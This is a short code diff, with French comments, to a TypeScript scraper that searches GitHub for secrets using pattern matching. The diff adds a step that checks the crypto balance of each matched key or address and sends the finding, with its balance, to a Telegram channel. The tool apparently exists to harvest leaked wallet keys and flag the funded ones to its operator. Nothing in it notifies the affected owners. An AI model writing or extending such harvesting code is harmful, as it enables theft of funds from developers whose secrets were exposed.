@@ -5,6 +5,8 @@ import logger from '../utils/logger.js';
 import rateLimiter from '../utils/rate-limiter.js';
 import patternMatcher from './pattern-matcher.js';
 import supabaseStorage from './supabase-storage.js';
+import balanceChecker from './balance-checker.js';
+import telegramNotifier from './telegram-notifier.js';
 
 export class GitHubScraper {
   private octokit: Octokit;
@@ -245,6 +247,17 @@ export class GitHubScraper {
             file: finding.file_path,
             severity: finding.severity,
           });
+
+          // Vérifier la balance crypto si c'est une clé/adresse crypto
+          const balanceInfo = await balanceChecker.checkBalance(
+            finding.pattern_type,
+            finding.code_snippet
+          );
+
+          // Envoyer notification Telegram avec info de balance
+          if (telegramNotifier.isConfigured()) {
+            await telegramNotifier.notifyFinding(finding, balanceInfo);
+          }
         }
       }
     } catch (error: any) {
